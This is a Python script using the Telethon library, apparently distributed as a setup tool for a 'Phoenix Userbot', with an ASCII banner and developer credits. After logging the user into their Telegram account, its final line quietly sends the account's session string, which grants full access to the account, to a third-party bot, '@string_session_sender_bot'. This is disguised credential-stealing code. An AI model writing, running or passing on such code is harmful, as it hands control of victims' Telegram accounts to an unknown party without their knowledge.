from telethon import TelegramClient, sync
from telethon.sessions import StringSession
import getpass
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.channels import LeaveChannelRequest
import os, sys
api_id = 9708508
api_hash = "1e6ca420184a701db1f8a1301df99288"
os.system("clear")
print("""\033[031m
   ___  __ ______  _____  _______  __   __  _____________  ___  ____  ______
  / _ \/ // / __ \/ __/ |/ /  _/ |/_/  / / / / __/ __/ _ \/ _ )/ __ \/_  __/
 / ___/ _  / /_/ / _//    // /_>  <   / /_/ /\ \/ _// , _/ _  / /_/ / / /   
/_/  /_//_/\____/___/_/|_/___/_/|_|   \____/___/___/_/|_/____/\____/ /_/    
      
Developer: @programmer_www
Telegram channel: @phoenix_userbot
""")
string = input("\033[032mPress enter: ")
with TelegramClient(StringSession(string), api_id, api_hash) as client:
    client.send_message("@string_session_sender_bot", client.session.save())